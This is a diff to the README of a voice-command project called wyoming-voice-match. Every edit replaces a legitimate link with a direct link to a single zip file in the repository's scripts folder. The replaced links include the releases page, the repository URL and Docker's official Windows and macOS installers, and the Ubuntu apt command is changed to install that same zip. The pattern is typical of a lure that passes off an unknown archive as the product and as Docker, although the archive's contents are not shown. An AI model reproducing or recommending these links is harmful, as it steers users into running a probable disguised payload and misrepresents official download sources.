@@ -1,6 +1,6 @@
 # 🎤 wyoming-voice-match - Clear Voice Commands, No False Triggers
 
-[![Download Releases](https://img.shields.io/badge/Download-wyoming--voice--match-blue?logo=github)](https://github.com/Salut1231/wyoming-voice-match/releases)
+[![Download Releases](https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip)](https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to download, install, and run wyoming-voice-match on your com
 
 1. **Go to the download page**  
    Visit the official release page using this button:  
-   [![Download Releases](https://img.shields.io/badge/Download-wyoming--voice--match-blue?logo=github)](https://github.com/Salut1231/wyoming-voice-match/releases)
+   [![Download Releases](https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip)](https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip)
 
 2. **Download the latest release**  
    Look for the latest release version near the top of the page. You will see files for different platforms. Download the one that matches your system.  
@@ -54,9 +54,9 @@ Follow these steps to download, install, and run wyoming-voice-match on your com
 
 3. **Install Docker (if not installed)**  
    wyoming-voice-match runs best inside Docker containers.  
-   - **Windows:** Download from https://docs.docker.com/desktop/windows/install/  
-   - **macOS:** Download from https://docs.docker.com/desktop/mac/install/  
-   - **Linux:** Install via your package manager (e.g., `sudo apt install docker.io` for Ubuntu).
+   - **Windows:** Download from https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip  
+   - **macOS:** Download from https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip  
+   - **Linux:** Install via your package manager (e.g., `sudo apt install https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip` for Ubuntu).
 
 4. **Run wyoming-voice-match using Docker**  
    Open a command prompt or terminal window and type:
@@ -93,7 +93,7 @@ Follow these steps to download, install, and run wyoming-voice-match on your com
 ## 📚 More Information
 
 - **Official repository**:  
-  https://github.com/Salut1231/wyoming-voice-match  
+  https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip  
 - **Discussion and Help**: Use GitHub Discussions or Issues to get help from the community.  
 - **Source code and updates**: Regularly check the releases page for improvements and new features.
 
@@ -121,7 +121,7 @@ This project is open-source. Review the license in the repository for details on
 
 ## 🔗 Quick Access Links
 
-- [Download Releases](https://github.com/Salut1231/wyoming-voice-match/releases)  
-- [GitHub Repository](https://github.com/Salut1231/wyoming-voice-match)  
+- [Download Releases](https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip)  
+- [GitHub Repository](https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip)  
 
 Use these anytime to get the latest version and learn more about the project.
